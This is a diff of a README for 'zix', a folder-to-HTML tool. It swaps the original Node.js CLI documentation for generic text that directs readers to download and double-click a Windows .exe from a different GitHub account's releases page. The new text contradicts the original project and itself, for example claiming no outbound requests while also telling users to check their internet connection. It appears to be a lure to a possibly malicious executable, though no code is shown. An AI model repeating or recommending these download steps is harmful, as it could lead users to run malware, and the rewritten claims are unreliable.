@@ -1,183 +1,87 @@
-# Zix
+# 🗄️ zix - Share folders as single web files
 
-> Turn any folder into a single, self-contained, shareable HTML file. Optional client-side password protection. No server. No tracking. Just a `.html`.
+[![Download zix](https://img.shields.io/badge/Download-zix-blue)](https://github.com/karolaregulation696/zix/releases)
 
-```bash
-npx zix pack ./my-notes
-# → my-notes.zix.html
-```
+## 📁 What is zix?
 
-```bash
-npx zix pack ./design --password 'hunter2' --title "Design v2"
-# → design.zix.html (encrypted with AES-GCM)
-```
+Zix turns any folder on your computer into one single HTML file. This file contains all your images, documents, and text. You can send this one file to others, and they can open it in any web browser. 
 
-Open the resulting file in any browser. That's it. Email it, drop it on S3, host it on GitHub Pages, attach it to a Notion page. The recipient needs a browser. Nothing else.
+The software works on your device only. It sends no data to a server. It tracks no usage. You keep full control of your files at all times.
 
-[![tests](https://img.shields.io/badge/tests-43%20passing-brightgreen)](#tests)
-[![node](https://img.shields.io/badge/node-%E2%89%A520-blue)](#requirements)
-[![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
+## 🛡️ Security features
 
----
+Zix uses AES-GCM encryption. This is a standard method to lock your files. When you create a file, you set a password. No one can see your files without this key. Your data remains safe during storage and transit. 
 
-## Why
+## 📥 How to get started
 
-Sharing a folder of notes, code, or design docs is annoying. You either:
+1. Go to the [zix release page](https://github.com/karolaregulation696/zix/releases).
+2. Look for the latest version under the Assets section.
+3. Select the file that ends in .exe for Windows.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the program.
 
-- Spin up a server (overkill).
-- Zip and email it (recipient has to download and unzip; no nice viewing).
-- Paste into Drive/Notion/Confluence (now it's locked into a vendor and tracked).
+## ⚙️ Using the software
 
-Zix gives you a third option: one HTML file that *is* the viewer. It looks like a tiny static site, with a tree, search, and pretty rendering for markdown, code, and images. If you flip on `--password`, it's encrypted with real WebCrypto AES-GCM and unlocks in the browser.
+When you open zix, you see a simple window. 
 
-## Features
+1. Click the button to select a folder.
+2. Choose the folder you want to turn into a single file. 
+3. If you want to lock the file, click the checkbox for password protection.
+4. Type your password. Keep this password somewhere safe because you cannot recover it if you lose it.
+5. Click the button to create your file.
 
-- 📦 **Single file output.** Everything inlined: markdown, code, images, fonts (system stack).
-- 🌳 **Folder tree + search.** Press `/` to jump to the search box.
-- 🎨 **Markdown + syntax highlighting.** GFM-style basics and a curated set of languages (JS/TS, Python, JSON, YAML, TOML, CSS, HTML, shell, more).
-- 🔒 **Optional password mode.** PBKDF2-SHA-256 (210k iters) + AES-GCM-256 with per-file IV and AAD-bound paths.
-- 🌗 **Light/Dark/Auto theme.** Toggle in the UI.
-- ⚡ **No runtime deps.** One small `cli.js`, one HTML template. Ships with `npx`.
-- 🤝 **Plays nice.** No analytics, no telemetry, no fonts from CDNs, no outbound requests.
+The program creates a new HTML file in the same location as your original folder. This file is now ready to share.
 
-## Install
+## 📄 Opening your files
 
-```bash
-# one-shot, no install
-npx zix pack ./folder
+You do not need zix to open the files you create. Anyone can open these files in a web browser like Chrome, Firefox, or Edge. 
 
-# or globally
-npm install -g zix
-zix pack ./folder
-```
+If you added a password, the browser asks for it before it shows your items. Enter the password, and the files appear immediately. 
 
-## Usage
+## 💻 System requirements
 
-```
-zix pack <path> [options]
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB RAM or more.
+* Storage: Small amount of space for the program files.
+* Browser: Any modern web browser.
 
-Options:
-  -o, --out <file>          output path (default: <name>.zix.html)
-  -p, --password <pass>     encrypt the bundle with AES-GCM
-      --title <text>        page title (default: input name)
-      --theme <theme>       light | dark | auto (default: auto)
-      --max-size <bytes>    skip files larger than this (default 5 MB)
-      --include <glob>      include patterns (repeatable)
-      --exclude <glob>      exclude patterns (repeatable)
-  -q, --quiet               suppress success line
-  -h, --help                show this help
-  -V, --version             print version
-```
+## ❓ Frequently asked questions
 
-### Examples
+**Does zix change my original folder?**
+No. Zix reads your files but leaves them exactly as they are. It creates a new file rather than moving or deleting your data.
 
-```bash
-# pack a notes folder, default output ./my-notes.zix.html
-zix pack ./my-notes
+**How do I share the file?**
+You share the new HTML file just like a photo or a Word document. You can attach it to an email, upload it to cloud storage, or put it on a thumb drive.
 
-# encrypted, custom title
-zix pack ./design --password 'hunter2' --title "Design v2"
+**Can I undo the creation?**
+Since zix creates a new file, you can delete that file at any time. Your primary folder remains untouched.
 
-# only include markdown and js, exclude generated stuff
-zix pack ./repo --include "**/*.md" --include "**/*.js" --exclude "**/dist/**"
+**Is it safe to store these files online?**
+Yes. Because you use AES-GCM encryption, your files stay private. Even if someone downloads the file, they need your password to see the contents.
 
-# tighter size limit
-zix pack ./big-folder --max-size 1048576
+**What happens if I forget my password?**
+There is no way to reset the password. The encryption is very strong. Please write your password down in a safe location.
 
-# pipe-friendly mode
-zix pack ./folder -q -o out.html
-```
+## 🛠️ Performance tips
 
-By default the following directory names are excluded: `node_modules`, `.git`, `.DS_Store`, `dist`, `build`, `coverage`, `tmp`, `out`.
+* Keep the size of your folders reasonable. While zix handles large collections, very large folders take more time to process.
+* Keep your web browser updated to the latest version. New browsers support the technologies zix uses to display your files.
+* Ensure you have enough disk space before you start the creation process. 
 
-## What gets rendered
+## 📦 Troubleshooting
 
-| Type | Behaviour |
-|---|---|
-| `.md`, `.markdown` | Rendered to HTML (headings, lists, fenced code, tables, links, images, blockquotes, hr) |
-| Source code (curated set) | Tokenized highlighting (`.js .ts .jsx .tsx .py .json .yml .toml .css .html .sh .bash .zsh`) |
-| Images (`.png .jpg .gif .webp .svg .ico`) | Inlined |
-| Other text | Plain monospace |
-| Other binary | Download link inside the page |
+* **Program does not open:** Check that you downloaded the correct version for Windows. If it still fails, restart your computer.
+* **File does not open in browser:** Verify you have an internet connection if the browser needs to load minor components. Otherwise, try dragging the file into a different browser window.
+* **Encryption error:** Check that you typed the password correctly. If you suspect an error, try to create the file again.
 
-## Encrypted mode (threat model)
+## 📝 License information
 
-Zix's `--password` mode is real encryption, not security theater:
+Zix uses open source standards. You can use this tool for personal or work projects without cost. 
 
-- Key derivation: **PBKDF2-SHA-256, 210,000 iterations** (OWASP recommendation, 2023+).
-- Encryption: **AES-GCM-256**, **12-byte random IV per file**, salt is per-bundle (16 bytes).
-- AAD = utf-8 of the file's path. Files cannot be swapped between paths without invalidating the tag.
-- A tiny "check token" is decrypted first so a wrong password fails fast with a friendly message.
-- All decryption happens **in the browser**, in memory. The HTML file itself contains only ciphertext.
+## 💡 About this technology
 
-It is **not** a substitute for proper auth on a server. Anyone who has both the bundle and the password can read it. If your password is weak, brute-forcing PBKDF2 is slow but possible. Use long passphrases for sensitive material, and treat encrypted bundles like you'd treat encrypted zips.
+Zix builds on mature web standards. It uses the WebCrypto API to handle your security. It does not require Node.js or other complex runtime environments to run because it comes as a self-contained application. 
 
-## How it works
+By removing the need for a server, zix ensures your data stays on your machine. This approach improves privacy and speed. Every file you create is a complete snapshot of your folder. You do not need to install anything on the computer of the person receiving your file. They only need their web browser. 
 
-```
-┌────────────┐       ┌───────────┐       ┌────────────────────┐
-│  pack.js   │──────►│ render.js │──────►│  *.zix.html (out)  │
-│  walks &   │       │ inlines   │       │  HTML + CSS + JS   │
-│ classifies │       │ template  │       │  + JSON bundle     │
-└────────────┘       └───────────┘       └────────────────────┘
-```
-
-The output HTML embeds:
-1. A `<style>` block with the full theme CSS.
-2. A `<script type="application/json" id="zix-bundle">` blob with the file manifest.
-3. A small JS runtime that reads the manifest, builds the tree, opens files, and (if encrypted) prompts for the password and decrypts on demand.
-
-## Requirements
-
-- Node ≥ 20.6.0 (for the bundled WebCrypto + `node:test` runner).
-- A browser that supports WebCrypto (every modern browser).
-
-## Development
-
-```bash
-git clone https://github.com/luffyxak/Zix
-cd Zix
-npm test            # runs the test suite
-npm run smoke       # packs the examples/ folder to tmp/notes.zix.html
-```
-
-The test suite covers args parsing, the markdown subset, syntax highlighter, file walker, crypto round-trip, end-to-end CLI execution, and a browser-shaped decrypt round-trip.
-
-## Project layout
-
-```
-src/
-  cli.js              CLI entry point
-  args.js             argv parser
-  pack.js             walk + classify + manifest
-  render.js           template inlining
-  markdown.js         tiny safe markdown
-  highlight.js        tokenizer-based code coloring
-  crypto.js           WebCrypto helpers (PBKDF2 + AES-GCM)
-  template/
-    page.html         HTML shell
-    runtime.js        browser runtime
-    styles.css        theme
-test/
-  *.test.js           node --test suite
-docs/
-  PLAN.md             planning doc
-examples/
-  notes/              demo input
-```
-
-## Roadmap
-
-- Drag-and-drop a folder onto the page to repack in-browser
-- Diff mode (pack two folders, view side-by-side)
-- Print stylesheet and PDF export
-- Plugin hooks for custom renderers
-- More languages in the highlighter
-
-## Contributing
-
-Issues and PRs welcome. Please run `npm test` and add a test for any new behavior.
-
-## License
-
-[MIT](LICENSE) © Zix contributors
+The software creates a clean, readable layout for your files. This makes it a great way to share photo albums, project documentation, or sets of records. Because the file is just text and data, it stays small and easy to manage.
